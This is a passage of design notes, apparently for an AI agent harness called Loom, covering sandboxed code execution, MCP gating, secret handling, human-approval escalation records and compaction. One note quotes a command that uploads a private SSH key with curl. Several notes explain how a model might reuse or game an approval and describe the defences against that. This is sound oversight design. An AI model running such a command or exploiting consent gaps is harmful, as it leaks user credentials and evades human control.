  cannot separate and a shared staging name is where they interleave.
  Idempotency is untouched: the destination is the address either way,
  and the `is_file` probe still skips the work.
- **`report.emit` is one mechanism on two seams, and the one workspace
  capability with a ceiling.** `cap/report` is the only module both
  vetting allowlists carry, so both routers answer `emit` — from the same
  closure, into the same blob root, under the same content address and
  the same 64-per-execution ceiling (`codemode/artifact`). It earns a
  ceiling where `fs.*` and `kv.*` do not because every admitted call
  writes something that *outlives the execution*, which is
  `satellite.CapCeiling`'s test; the scratch store is bounded store-side
  by bytes with eviction instead, which is the right instrument for
  something that must not grow rather than something that must not be
  called often. So the workspace seam's ceiling list is no longer empty,
  and the comment saying it was is gone.
- **The only thing the code-mode wiring adds to a session base is two
  environment *names*.** `LOOM_CAP_SOCK` and `LOOM_CAP_TOKEN_FILE` are
  set by the launcher and cannot be shadowed by a caller's `env`, but
  policy composition takes the meet — so a base that does not name them
  composes them away and the satellite cannot find the channel it exists
  to speak on. `execution_policy` adds exactly those two and leaves every
  other dimension untouched; it is one small named function so it stays
  auditable rather than diffusing into the wiring.
- **An execution's files live in their own directory inside the
  workspace,** named for `{op_id, step_id, source_index}` and removed
  when the execution settles. Inside the workspace, so the session base already
  makes it writable and nothing has to be widened to build there; unique
  per execution, so neither two strands running code mode at once nor two
  `code_mode` calls in one batch can share a build root. The third field
  is what makes the second true: `code_mode` is `tool.Exclusive`, which
  forbids a concurrent *start* and nothing more, so one batch may hold two
  `code_mode` calls that run back to back under one operation and one
  step. Keyed on the pair they would build in one directory, bind one cap
  socket and write one token file — and the launcher's janitor runs
  teardown asynchronously after the host dies, on ordinary exits too, so
  the first execution's cleanup could unlink the second's live socket and
  token, while `prepare_root`'s recursive delete races the same janitor
  the other way (issue #87). The name is a short digest of that triple
  rather than the triple itself, because the cap socket sits inside it and
  an AF_UNIX path is capped near 108 bytes — a socket that would exceed
  the limit is refused in band, naming the workspace, instead of failing
  as an opaque `einval` from `listen`.
- **MCP reaches a model through code mode, and a host with no code mode
  starts no MCP server.** A server's tools are a *module* a program may
  import, never a registered tool, so a host that registers no
  `code_mode` has nothing that could ever call one — and spawning
  third-party server processes for it would be cost and attack surface
  bought for no capability. One `mcp.unavailable` line says so, naming
  the servers that were skipped. Per server, every failing step —
  a missing executable, a refused handshake, an unset `api_key_env`, a
  listing the generator will not accept — is one more `mcp.unavailable`
  line and no boot failure, and it is the only thing anybody will ever
  see about it: a refused server has no module, so a program importing it
  is refused by vetting with no word about why the module is absent. A
  working layer logs `mcp.ready` with each server's name and tool count.
- **An `api_key_env` is a variable name, and the value is read at spawn
  and never held.** It is resolved from the harness's own environment
  through the same `provider/secret` seam every other configured secret
  goes through, put into the child's environment under the same name, and
  never stored in a record, a log line, or a refusal message. A
  configured variable that is unset refuses that server *before* anything
  is spawned.
- **Registration is gated on the seam, for both families.** A host with
  no messaging plane ships no `agent_*` tools and a host with no
  toolchain or no prepared build seed ships no `code_mode` — the boot
  says which is missing, once, as a `codemode.unavailable` log line, and
  the registry it actually built as `server.tools`. The wire tool array
  is the byte prefix of the provider's cached region, so a
  permanently-refusing definition would be paid for on every request of
  every strand for the life of the session. **The message is part of the
  mechanism, not decoration**: it is the only thing anybody will ever
  see about an absent code mode, because there is no tool left to fail
  later, so it names what is missing, both places that were looked, and
  the way to supply it. A working host logs `codemode.ready` with the
  `gleam`, the `erl` and the seed it settled on.
- **A component of Loom is looked for in Loom's own tree before `PATH`.**
  The helper, the emulator and the compiler are all located from
  `code:root_dir()` first (`client/install`). For `loom-exec` that is a
  security property rather than a convenience: it is the binary that
  builds the namespaces and applies Landlock and seccomp, so a stray one
  an unrelated install left on `PATH` must not outrank the audited one
  shipped in the same tree as the running server. An explicit `--helper`
  still outranks both, because that is how an operator points at a helper
  they audited themselves, and a flag naming a missing file refuses
  saying so rather than falling through to one they did not choose.
- **Approved grants are validated structurally against the wanted diff**
  before being stored back in the runtime's internal vocabulary, so the
  consume path hands a re-execution exactly what was approved.
- **A grant reaches a policy decision through the call it was approved
  for, and by no other route.** `wiring.tool_context` builds `Ctx.grants`
  from `effects.ToolRun.grants` — what *this call's* clearance consumed —
  decoded from the escalation vocabulary here, because the runtime moves
  those payloads opaquely. A payload that will not decode is dropped
  rather than faulted on: skipping a grant can only narrow what the call
  receives, and the call still settles in band under whatever remains.
- **A base that covers every shipped tool can never park.** Composition
  refuses only when a tool's requirements exceed the base, and
  `base_policy` grants read of `/`, writes to the workspace, and the four
  environment names `bash` passes — which is every requirement any
  shipped tool has, since all of them are static rather than derived from
  call arguments. So the default posture is one where the escalation
  plane is real but dormant, and a host that wants approvals to mean
  something serves a narrower `Settings.base_policy`. This is why the
  base is a setting: a test cannot otherwise boot a real server into a
  state where a refusal happens at all.
- **Every policy refusal raises a durable record; only some park.** The
  two questions are separate on purpose. Raising is unconditional and
  deduplicated by a digest of `{strand, tool, wanted diff}`, so a model
  that retries lands on the record already pending instead of one row per
  attempt, and the in-band error stands alongside it. *Parking* — holding
  the call open until a human decides — happens only when
  `Config.interactive` says someone is attached, because a parked call in
  a headless session is a hang. Which raised records actually interrupt a
  person stays a client-surface decision: the hub already emits
  escalation events and lists pending ones in its snapshot, so approval
  fatigue is tunable in a UI rather than frozen in a deploy.
- **An approval is consent about an *action*, not about a want.** The
  record id digests `{strand, tool, wanted diff}` and says nothing about
  the command behind it, so two calls that differ only in what they run
  land on one row — which is right for deduplication and catastrophic
  for consent: a yes given to `bash "true"` would otherwise be spendable
  by `bash "curl -T ~/.ssh/id_rsa …"` in a different operation, later in
  the session (#65). So a raise carries `action_digest` of the call's
  effective arguments alongside the id, the record stores it, and only a
  claimant that digests the same inherits the approval. Anything else
  re-opens the record as a fresh `Pending` question bound to the new
  action, and the model sees the byte-identical in-band refusal a first
  denial produces — it must never be able to observe that an approval
  existed and was set aside. Nothing is excluded from the digest: a
  field the consent layer overlooks is a field the model may vary after
  consent. `escalate.spend` re-checks the binding beside the scope check
  and, on failure, settles in band leaving the record untouched.
- **Re-opening is bounded, because the party provoking it is the party
  being constrained.** The mismatch edge above is a *new* way into
  `Pending`, so `Config.max_asks` (3) caps the questions one row may put
  and the claim comes back `Exhausted` past it: nothing written, nobody
  asked, the call settled in band (#66).
- **A claim's checks and its commit are the same read.** The park's probe
  reads an `api.EscalationCell` and spends through
  `api.consume_escalation_at`, which CASes at that seq, so a claim
  landing between the scope-and-action checks and the consume loses the
  commit instead of passing unseen (#68). The cell travels through the
  `weft/poll` loop as the probe's own value, so moving the loop onto the
  primitive did not put a re-read between the decision and the CAS.
- **Both foreground waits make a first attempt immediately and a last one
  at the deadline.** That is `weft/poll`'s contract, not this package's,
  and it changed one behaviour worth knowing: `park` used to check its
  deadline *before* reading the record, so a window already shut settled
  without a read. It now costs one read, and an approval landing exactly
  on the deadline is honoured rather than missed. `agency.wait_loop` folds
  the map of already-settled handles from one attempt to the next, so a
  slice never re-asks the store about a child that answered on the first
  pass, and expiry hands that map back (`poll.RanOut`) so the settled
  children are still reported `Ready`.
- **And so is an approval's.** `approve` carries the diff and the action
  digest the client *rendered*; `gateway.approve` reads one
  `api.EscalationCell`, checks the echo against that value, and commits
  the `Approved` write CAS-guarded at that same seq — which is why it
  builds the transaction itself rather than calling
  `api.approve_escalation`, whose own read the checks would not be about.
  A refreshing claim is exactly what makes the check mean something: it
  changes what the record wants and bumps the register seq, so it either
  fails the echo or loses the commit. A mismatch answers
  `stale_approval` with the fresh record in `details` and writes nothing
  (`protocol-change/007`, #72). The record's `CallScope` is also what
  `op`/`strand` on the wire now come from, in place of a guess at which
  strand was busy (#67).
- **A raise *claims* the record; the scope is the call standing at the
  door now.** The digest deliberately excludes the call id, so under a
  retry the row is already there when a refusal arrives — and the call
  that opened it has already settled, because a model that reads an
  in-band refusal retries under a call id the provider mints fresh. So
  `api.claim_escalation` moves the scope to the live call under a CAS
  instead of refusing the duplicate: a pending record moves and refreshes
  its stored denial, an approved one moves and keeps its grants, and a
  consumed or rejected one re-opens as a new question with no grants.
  Without that the ordinary first-run sequence — refusal with nobody
  attached, a human attaching and approving, the model retrying — leaves
  an approved record scoped to a call that will never come back, which
  nothing can ever spend and nothing can ever replace (the register is
  write-once and there is no delete path). Two consequences are
  deliberate: two calls wanting the same thing at once share one prompt
  and therefore one authorization, and approving a want does not make it
  unaskable — the next call wanting it asks again, because a standing
  permission is a wider base policy rather than an approval that never
  expires.
- **The escalation set is bounded on both axes, because two constantly
  running paths scan the whole `escalation/` prefix** — a tool clearance
  looking for approvals attributed to it, and the gateway's pull turning
  new records into events. *Width*: a limit grant contributes its
  **field** and not its magnitude to the dedup digest, because `bash`
  turns a model-supplied `timeout_ms` into the `wall_s` it asks for, and
  under a narrow base that number reaches the wanted diff — a retry loop
  stepping it would otherwise mint a record, and a prompt, per attempt.
  The magnitude still reaches the human: it is in the record's stored
  denial, which is what an approval is granted against. *Count*:
  `Config.max_records` caps the distinct wants a session will file, and
  past the cap a refusal that would open a **new** record settles in
  band; one that lands on a record already there costs no row and is
  never turned away.
- **A park waits on the tool's own effect process, never on the driver.**
  `Hooks.run_end` is not the only thing that must not block `drive_loop`:
  a driver stuck inside a clearance stops serving `Nudge`,
  `RequestAbort` and `PollTick`, so a human who changed their mind could
  not abort the run they are being asked about. Parking in the broker
  seam — inside `Ctx.clear_call`, on the process the driver spawned and
  monitors — also means the wait needs no timer and leaks no process: the
  effect process is linked to the driver's reaper, so an abort or a
  driver restart kills the parked call and the driver settles it in band
  through the ordinary monitor path.
- **Provider wrappers inherit stream ownership.** `gateway.tap_provider` and
  `wiring.recording_summaries` each return a prepared provider surface. Each
  wrapper publishes a minimal custodian while its guard is parked; only after
  the parent adopts that owner does the guard prepare and adopt the inner
  stream, then grant its begin permit. The guard
  remains the inner stream's direct consumer; only each synchronous observer
  call moves to a monitored worker. The custodian adopts both and the inner
  owner, while the guard retains its own pre-begin drain monitor. It forwards
  cancellation inward and bounds missing acknowledgement with
  `CancellationUnconfirmed`, then stays alive until the registered subtree
  exits. An abnormal transitive Down becomes terminal `DrainProofLost`, never
  retry permission. This keeps the chain continuous from driver reaper to runtime
  custodian, relay custodian and guard, gateway custodian, guard and pump, and
  the native HTTP owner plus its dedicated handler; no wrapper may turn
  consumer death into a detached request.
- **Named helper traffic binds observation and delivery to one incarnation.**
  Ephemeral commit hints, provider deltas, hub casts, and holder calls resolve
  a registered name once, then send its tagged envelope directly to that PID.
  If an optional hub unregisters before resolution its hint is dropped; if it
  exits afterward the PID send is a no-op or the caller's existing monitor
  reports unavailability. Re-resolving the name inside `process.send` would
  leave a race that converts an ordinary restart into a caller crash, or asks a
  replacement while still monitoring its predecessor.
- **Wrapper comments narrate ownership handoffs.** The module story names why
  the guard, observer, and custodian are separate; comments at publication and
  adoption say what becomes safe after each acknowledgement. Do not reduce
  this to comments which merely restate a `spawn`, `send`, or monitor call.
- **A park is bounded by the configured window *and* by the call's own
  budget deadline, and the deadline is re-read immediately before the
  consuming commit.** The second bound is not politeness: the broker's
  ledger refuses a reservation past `deadline_ms`, so a re-clearance
  after that instant is a `BudgetRefused`, not a resumption, and holding
  a call past it would trade an honest "policy refused" for a confusing
  "deadline passed". The re-read is the same fact one step further in:
  the consume is a writer round trip, so a slice admitted just inside the
  window could otherwise commit `Consumed` on its way to a budget
  refusal, spending an approval on an execution that never happens. Both
  bounds are read from the session's own clock, which is why the seam
  must share it (spec §0.2). What the budget bounds is *admission*, not
  total elapsed time: a resumed call re-enters `reserve_budget` with its
  `CallSpec` unchanged and gets the original `wall_s`, so a parked call's
  lifetime is `park + wall`.
- **An approval buys exactly one re-clearance, of exactly one call.** The
  record's `CallScope` is checked — exact equality — before anything is
  spent, so a call that lost the claim to another call cannot burn the
  approval that other call is standing at; the consume is a CAS that must
  win *before* the grants compose into a policy; and the resumed call is
  cleared once, not retried in a loop — if the widened policy still does
  not satisfy the tool, the second refusal stands in band. Only a call
  whose denial digests to the record's own id can ever hold the claim, so
  "one call" is always a call wanting the same thing on the same strand
  through the same tool, and the grants it spends are the ones a human
  chose rather than its own. A lost CAS, a lost claim, a decode failure,
  a denial, a closed window, a passed budget deadline, a disconnected
  client, an unanswering hub and a crash all end in the same in-band
  refusal.
- **Asking another process a question never kills the asker.**
  `process.call` exits its *caller* on timeout rather than returning an
  error, and both questions this package asks on a parked call's own
  effect process — `gateway.attached` once a second for the length of the
  park, and `escalate.borrow` once per refusal — would therefore turn a
  merely slow answer into a dead tool call, settled by the driver as a
  death with no stated reason where the seam's doc promises an in-band
  policy refusal. Both send and select by hand instead, watching the
  callee's monitor: absent, dead, dying mid-answer and too slow all
  degrade to "nobody is there", which un-parks the call and settles it.
- **Compaction is answered by these seams, and by nothing that supplies
  its own summary.** `compaction_hooks` returns `VerdictGenerate` for
  every structural decision: `VerdictSupplied` exists for a host that
  brings its own summarizer, and a harness that used it here would be
  answering its own compaction. The M3 demo installs *these* hooks over
  its scripted provider — it has no `demo_hooks` of its own — so the
  `CompactionEntry` it asserts on carries text that came off the wire.
- **A summary request carries no system prompt and no tool array**, and
  its whole content is one assembled user message. Both one-hour cache
  breakpoints hang on the two positions it omits, so a prompt read
  exactly once writes no long-lived cache entry and cannot disturb the
  session's own pinned head (pi's `cacheRetention: "none"`, expressed as
  a request shape). The residual cost is the adapter's rolling
  five-minute mark on that single user turn; removing it needs a
  request-level cache flag in `provider`, which this stage did not open.
- **Role follows identity, and the role is derived at dispatch.** An
  `effects.RequestSpec` carries no strand name and one wiring config
  serves every strand, so `wiring.request_target` asks the *captured
  identity* which role it is on: the first routable role in canonical
  order (`main`, then `subagent`) whose usable chain **head** equals it,
  ties to `main`. A match dispatches `ForRole`, so the gateway walks that
  chain inside the one attempt and a rate-limited head costs a fallback
  rather than the machine's retry ladder. No match dispatches
  `ForResolved` on exactly the captured identity. Both answers are a pure
  function of durable state and boot configuration, which is what makes a
  post-crash re-attempt choose what the original attempt chose — recovery
  orphans an in-flight request and re-attempts it, it never re-dispatches
  one. There is deliberately no per-request rerouting, no mutable role
  registry, no health tracking and no sticky chain position: the head is
  tried first, every time.
- **A deferred poll is always `ForResolved`.** The handle belongs to the
  identity that minted it and ORCH-L4 validates the settlement against
  exactly the captured `{provider, model_id, api}`, so a poll that walked
  a chain would fetch a continuation nobody issued. The mirror cost is
  written down in `protocol-change/009`: a *generation* settled by a
  fallback target that returned `Deferred` fails the same check and drains
  as failure. Nothing settles `Deferred` today.
- **Summaries route through the `Summarize` role when one is
  configured** — as a role, `ForRole(Summarize, None)`, chain walk
  included — and fall back to the strand's own target when it is not.
  Unlike a generation there is no durable identity contract to honour:
  the summary is published as text, not as a response attributed to a
  model. `None` is the one place a route's own declared thinking level is
  left standing, because a one-shot prompt has no per-turn budget to
  inherit from the conversation it is summarizing.
- **A catalogue entry's `thinking` seeds a strand; it never overrides a
  dispatch.** The per-turn level is absolute at dispatch and travels as
  the walk's overlay onto *every* target attempted, so a fallback cannot
  answer at a smaller reasoning budget than the head was asked for.
  Where the entry's level does take effect is strand *creation*, at all
  three points and by one lift (`wiring.strand_thinking_level`):
  `serve.seed_thinking` for `main`, `gateway.seeded_thinking` for
  `fork`/`create_strand`, and `agency.child_configuration` for a spawned
  child. `set_config model_name` deliberately leaves `thinking_level`
  alone — switching model is not a request to un-raise a budget somebody
  raised.
- **A spawned child's model is chosen once, at creation.**
  `agency.Config.subagent_model` is the host's `subagent` route resolved;
  `client/serve` fills it from the gateway. An unrouted subagent role
  inherits the parent wholesale rather than refusing, which is what every
  child did before the role reached the seam.
- **Model facts follow the identity, not the configured role.**
  `wiring.Config.facts` is an `identity -> #(ResolvedModel, api)` seam
  `client/serve` builds from the catalogue, and it is what makes a strand
  switched off-route honest: admission is answered **per query** from the
  query's own configuration, the compaction threshold's window is the
  *strand's*, and an off-route dispatch target carries the switched-to
  entry's counts. The api half matters as much as the counts — it is
  captured durably into the generation intent and is what ORCH-L4 later
  validates a deferred handle against, so a boot-frozen answer named the
  main entry's dialect for a strand switched to the other one. Only an
  identity the catalogue does not know falls back to `Config.api` and the
  two `fallback_*` counts.
- **A summary the sink does not hold is a retryable failure, never an
  empty summary.** `SummaryProduced(summary: "")` would publish a
  `CompactionEntry` that silently replaced a conversation with a blank;
  asking the provider again costs one request. That is also why the
  record is filed *before* the terminal event is forwarded to the effect
  process: by the time the driver asks for progress, the text is already
  there. A crash, a reaped effect, or an evicted record all read as
  `Absent` and retry, which is exactly what the machine does for an
  orphaned summary request.
- **A summary response that reached for a tool is a failed attempt.**
  The summarizer was sent no tool array, so a call in its answer means
  it did something other than summarize, and publishing its prose would
  be guessing. So is an answer with no text.
- **The operator's `compact` instructions reach the provider from the
  operation's durable state**, not from the preparation:
  `StructuralPreparation` has no field for them, because the preparation
  is the *input* the decision hook froze and the instructions are a
  property of the operation that asked.
- **A manual `compact` cuts where an automatic one cuts.** The hub's
  preparation goes through `runtime/hooks.preparation` — the same
  builder the threshold and overflow hooks use — against the run's own
  settings snapshot.
- **The server has two supervision tiers, and the line between them is
  reachability.** A child under `Booted.services` — the commit
  forwarder, the Agency holder, the escalation holder, the scratch
  store, the rule scanner, the scheduled-heartbeat scanner, the
  search-index holder and its commit subscriber, the gateway hub —
  is addressed by
  *name*, so a replacement under that name is the same address and a
  crash costs hints and the sockets already attached to the old hub
  rather than the server. The helper pool, the broker, and the summary
  sink are captured *by value* into closures built during the boot, so a
  replacement would be unreachable by everything already holding the old
  handle: restarting one leaves a server that looks alive and refuses
  every call, and failing closed is the posture the effect plane wants
  anyway. Those are fatal, along with the session tree, the listener,
  and the service supervisor once its own budget is spent.
- **A plane nobody configured costs nothing, and says so.** A
  `loom.toml` with no `[[rule]]` starts no scanner at all — not a
  scanner holding an empty list — and logs `rules.none`; a configured
  one logs `rules.loaded` with the count and the names. A `loom.toml`
  with no `[[schedule]]` takes the identical posture: `schedules.none`
  or `schedules.loaded`, no scanner started or a supervised one holding
  exactly the configured list. This is the `codemode.unavailable` line's
  reasoning applied again: an operator who configured something and
  sees no effect must have a line to reason from, and a host that
  configured nothing must run exactly the processes it ran before the
  feature existed.
- **A dormant rule is byte-absent from a context, not merely cheap.**
  Rules live in the configuration file, fired-marks and cursors live in
  reserved registers, and neither is an entry — so nothing a rule
  contains can reach a projection until the scanner commits an
  injection. The projection tests assert exactly that, in both
  directions.
- **Recall is a projection with no authority, and the wiring says so
  three times.** An index that will not open costs the `history_search`
  tool and one log line, never the boot. A holder that crashes is
  restarted and reopens the file. A sync that fails leaves the durable
  cursor where it was, so the next commit's poke retries it. Nothing
  about a session's correctness depends on the index being right, which
  is what lets every one of those failures be quiet.
- **A fatal death is an orderly shutdown, not a side effect.** The host
  traps exits, so a child's death is a message: it runs the whole
  teardown — listener, services, runtime (which releases the writer
  lease), broker, pool, sink — *before* reporting, and the entry point
  exits nonzero afterwards. The one case this cannot cover is the
  storage actor's own death, because it is the connection that would
  delete the lease row.
- **The entry point has two output channels, and the split is
  deliberate** (§3.4). **stdout** carries the startup banner and nothing
  else — the ephemeral port, the token path, the prompt digest — because
  that is this process's contract with whoever launched it and a
  supervisor script reads it with `head -1`. **The log stream** carries
  everything about the running system, as JSON, one event per line, all
  of it correlated to the session. A *usage* error is on neither side of
  that split: it belongs to the person who mistyped a flag, before there
  is a session to correlate anything to, so it stays on stderr with the
  usage text. Everything downstream of a successful flags parse — the
  boot failure, the SIGTERM stop, a fatal child, an absent code-mode
  toolchain, a prompt-pack warning — is a log line.
- **The handler is installed before anything can fail.** `main`'s first
  act is `handler.install`, so no line of a boot lands on the VM's
  default text formatter; `LOOM_LOG_LEVEL` sets the threshold and an
  unrecognised value falls back to `info` rather than refusing to boot.
- **Only an entry point installs the signal handler.** `wait_for_sigterm`
  replaces the VM's default `erl_signal_handler`, whose answer to
  `SIGTERM` is an immediate `init:stop()`, so `boot` never touches it —
  `main` does, through `host.relay_sigterm`, and a test that boots a
  server leaves the node's signal handling alone.

## Deep Docs

- [docs/architecture/orchestration.md](../../docs/architecture/orchestration.md)
  — the runtime surface the hub dispatches onto.
- [docs/architecture/durability.md](../../docs/architecture/durability.md)
  — seqs, write-once rows, and why the event stream needs no side index.
- [docs/spec-gaps.md](../../docs/spec-gaps.md) — "From WP-L (`client`)":
  the missing compaction/navigation api entry points, brief-less strand
  creation, protocol fork forking in place, fixture-versus-codec drift,
  queued-versus-placed acks, and the provider delta tap.
- [protocol-change/007-escalation-carries-the-action.md](../../protocol-change/007-escalation-carries-the-action.md)
  — why `escalation` carries the tool, the action digest and a bounded
  argument preview, why `approve` echoes them, and the rendering rules
  that bind any client showing a preview.
- [docs/design-notes/agent-comms-and-system-prompt.md](../../docs/design-notes/agent-comms-and-system-prompt.md)
  — Part B: the pack's sections, the stability contract, and why
  the prompt is pinned rather than re-derived.
- [docs/review/m5-agent-comms-judgment.md](../../docs/review/m5-agent-comms-judgment.md)
  — change items 5 and 6, which the sandbox wording and the
  pin-around-the-lease ordering follow.
- [docs/architecture/code-mode.md](../../docs/architecture/code-mode.md) —
  the pipeline `client/codemode` wires, and what each layer confines.
- [packages/codemode/CLAUDE.md](../codemode/CLAUDE.md) — the pipeline's
  own package.
- [docs/design-notes/compaction-and-memory.md](../../docs/design-notes/compaction-and-memory.md)
  — Stage C0: which seams were inert, what each hook now decides from,
  and the cache arithmetic the summary request's shape follows.
- [packages/prompt/CLAUDE.md](../prompt/CLAUDE.md) — the pure half:
  the pack format, the renderer, the summarization pack, and what
  `Environment` may never grow.
- [packages/tui/CLAUDE.md](../tui/CLAUDE.md) — the other end of the wire.
- [Root CLAUDE.md](../../CLAUDE.md) — repo ground rules and the doc graph.
